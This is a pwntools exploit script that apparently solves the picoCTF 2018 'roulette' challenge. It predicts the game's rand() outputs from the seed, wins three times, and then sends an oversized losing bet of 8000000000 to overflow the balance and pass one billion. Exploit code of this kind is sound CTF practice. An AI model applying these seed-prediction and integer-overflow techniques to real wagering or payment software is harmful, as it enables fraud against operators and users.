#!/usr/bin/python2
from pwn import *

p = None
oracle = None

def getProcess():
    is_remote = False
    if is_remote:
        return remote('2018shell1.picoctf.com', 25443)
    else:
        return process('../roulette')

# get the next prediction for a number in the roulette
def get_next():
    return oracle.readline()
    
# skip the rand() values which are wasted on win_msgs (1 time)
#   or lose_msgs2 (2 times)
def ignore_lines(loss = False):
    oracle.readline()
    if loss:
        oracle.readline()
    
def get_balance():
    global oracle
    global p
    p.recvuntil('Current Balance: $')
    # strip spaces
    money = str(int(p.recvuntil('Current Wins:', drop=True)))

    if not oracle:
        oracle = process(['./predictor', money])
        info ("Seed: %s" % money)
    
    return money

p = getProcess()

# get starting money
money = get_balance()
info ("Starting Money: %s" % money)

# Win 3-times in a row to satisfy the first condition
for i in range(3):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(get_next())
    
    ignore_lines(loss = False)

    money = get_balance()
    success("Win!!!")
    info ("Money: %s" % money)

# Loss on purpose so we will gain a lot of money
p.recvuntil('> ')
# integer overflow
p.sendline('8000000000')
p.recvuntil('> ')
# ignore next
get_next()
# hopefully incorrect
p.sendline('1')

ignore_lines(loss = True)

money = get_balance()
warning ("Lost (on purpose)")
info ("Money: %s" % money)

# win again to pass the one billion
p.recvuntil('> ')
p.sendline(money)
p.recvuntil('> ')
p.sendline(get_next())

p.interactive()
